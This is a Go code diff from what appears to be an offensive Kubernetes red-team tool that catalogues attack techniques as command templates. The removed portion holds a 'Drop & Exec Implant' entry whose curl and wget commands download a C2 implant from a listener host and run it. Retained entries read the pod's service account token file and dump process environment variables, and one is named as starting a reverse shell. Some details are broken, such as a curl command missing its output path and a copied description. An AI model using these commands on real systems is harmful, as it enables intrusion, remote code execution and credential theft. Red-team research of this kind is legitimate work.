@@ -2,17 +2,13 @@ package armory
 
 import (
 	"cmp"
-	"encoding/json"
 	"errors"
 	"fmt"
 	"io/fs"
-	"log/slog"
 	"os"
 	"path/filepath"
 	"slices"
 	"strings"
-
-	k8s_types "github.com/Magier/Ran/k8sclient/types"
 
 	"github.com/Magier/Ran/domain"
 	"gopkg.in/yaml.v3"
@@ -50,7 +46,7 @@ func LoadArmory(dir string) (Armory, error) {
 			if err != nil {
 				return fmt.Errorf("failed to unmarshal YAML content from file %s: %w", w, err)
 			}
-			ttp.CommandMsg = parseCommandToMessage(ttp.Command)
+			// ttp.CommandMsg = parseCommandToMessage(ttp.Command)
 			ttps = append(ttps, ttp)
 		}
 
@@ -65,20 +61,6 @@ func LoadArmory(dir string) (Armory, error) {
 
 	ttps = append(ttps, []domain.TTP{
 		{
-			Name:        "Drop & Exec Implant",
-			Description: "Command to download a prepared C2 implant and execute it to establish a session",
-			Tactic:      domain.Execution,
-			Args: map[string]string{
-				"SRC_BIN": "implant",
-				"DST_BIN": "/tmp/pause",
-			},
-			CmdVariants: []domain.CmdVariant{
-				{Key: "curl", Command: `sh -c "curl -L ${LISTENER}:${FILESHARE_PORT}/${SRC_BIN} -o  && chmod +x ${DST_BIN} && ${DST_BIN} &"`},
-				{Key: "wget", Command: `sh -c "wget ${LISTENER}:${FILESHARE_PORT}/${SRC_IN} -O ${DST_BIN} && chmod +x ${DST_BIN} && ${DST_BIN} &"`},
-			},
-			Requires: domain.Requirements{AccessLevel: domain.UserExec},
-		},
-		{
 			Name:        "Read SerivceAccount Token",
 			Description: "Command to download a prepared C2 implant and execute it to establish a session",
 			Tactic:      domain.CredentialAccess,
@@ -89,8 +71,8 @@ func LoadArmory(dir string) (Armory, error) {
 			Args:     map[string]string{"": "/var/run/secrets/kubernetes.io/serviceaccount/token"},
 			Requires: domain.Requirements{AccessLevel: domain.UserRead},
 			// Effects:  []domain.Event{domain.ServiceAccountTokenExtracted{}},
-			Effects:       []string{"src.Pod.name", "ServiceAccount.name", "Namespace.name"},
-			ResultHandler: handleSaTokenRead,
+			Effects: []string{"src.Pod.name", "ServiceAccount.name", "Namespace.name"},
+			// ResultHandler: parsers.HandleSaTokenRead,
 		},
 		{
 			Name:     "Install kubectl",
@@ -122,7 +104,7 @@ func LoadArmory(dir string) (Armory, error) {
 						"spec": { "namespace": "${NS}" }
 					}'`},
 			},
-			ResultHandler: handleSelfSubjectReviewResult,
+			// ResultHandler: parsers.HandleSelfSubjectReviewResult,
 		},
 		{
 			Name:        "Start reverse shell",
@@ -143,7 +125,7 @@ func LoadArmory(dir string) (Armory, error) {
 				{Key: "shell", Command: `env`},
 				{Key: "cat", Command: `cat /proc/self/environ`},
 			},
-			ResultHandler: handleEnvVarResult,
+			// ResultHandler: parsers.HandleEnvVarResult,
 		},
 	}...)
 
@@ -195,89 +177,4 @@ func (a Armory) GetTTP(id string) (domain.TTP, bool) {
 
 func (a Armory) GetTTPs() []domain.TTP {
 	return a.ttps
-}
-
-func handleEnvVarResult(source domain.Entity, args ...any) (domain.Event, error) {
-	stderr := args[1].(string)
-	if stderr != "" {
-		return nil, errors.New(stderr)
-	}
-
-	stdout := args[0].(string)
-	vars := make(map[string]string)
-	for _, l := range strings.Split(stdout, "\n") {
-		k, v, ok := strings.Cut(l, "=")
-		if ok {
-			vars[k] = v
-		}
-	}
-
-	return domain.EnvVarsExtracted{
-		Source: source,
-		Vars:   vars,
-	}, nil
-}
-
-func handleSaTokenRead(source domain.Entity, args ...any) (domain.Event, error) {
-	if len(args) == 0 {
-		return nil, fmt.Errorf("No SA token provided as argument")
-	}
-
-	var token string
-	switch t := args[0].(type) {
-	case string:
-		token = t
-	case []byte:
-		token = string(t)
-	}
-	if len(token) == 0 {
-		return nil, fmt.Errorf("Empty SA token can't be decoded")
-	}
-	if len(args) > 1 {
-		if args[1] != "" {
-			return nil, fmt.Errorf("Sa Token Read expects exactly 1 argument - received %d", len(args))
-		}
-	}
-	return domain.ServiceAccountTokenExtracted{
-		SourceSystemId: source.GetId(),
-		Token:          token,
-	}, nil
-}
-
-func handleSelfSubjectReviewResult(source domain.Entity, args ...any) (domain.Event, error) {
-	// try parse JSON
-	if len(args) == 0 {
-		return nil, fmt.Errorf("No data")
-	}
-	jsonData, ok := args[0].(string)
-	if !ok {
-		return nil, fmt.Errorf("Expected string data")
-	}
-
-	var result k8s_types.SelfSubjectRulesReview
-	err := json.Unmarshal([]byte(jsonData), &result)
-	if err != nil {
-		return nil, fmt.Errorf("Failed to unmarshal JSON: %w", err)
-	}
-
-	if result.Code >= 400 {
-		return domain.TTPFailed{
-			Reason: result.Message,
-		}, nil
-	}
-
-	if result.Status.Incomplete {
-		slog.Warn("Results from SelfSubjectRulesReview are incomplete!")
-	}
-
-	sa, ok := source.(domain.ServiceAccount)
-	if !ok {
-		slog.Warn("the source of the SubjectReviewResult is not a valid ServiceAccount!")
-	}
-	return domain.TokenPermissionsRetrieved{
-		TokenName:        source.GetName(),
-		ServiceAccount:   sa,
-		ResourceRules:    result.Status.ResourceRules,
-		NonResourceRules: result.Status.NonResourceRules,
-	}, nil
 }
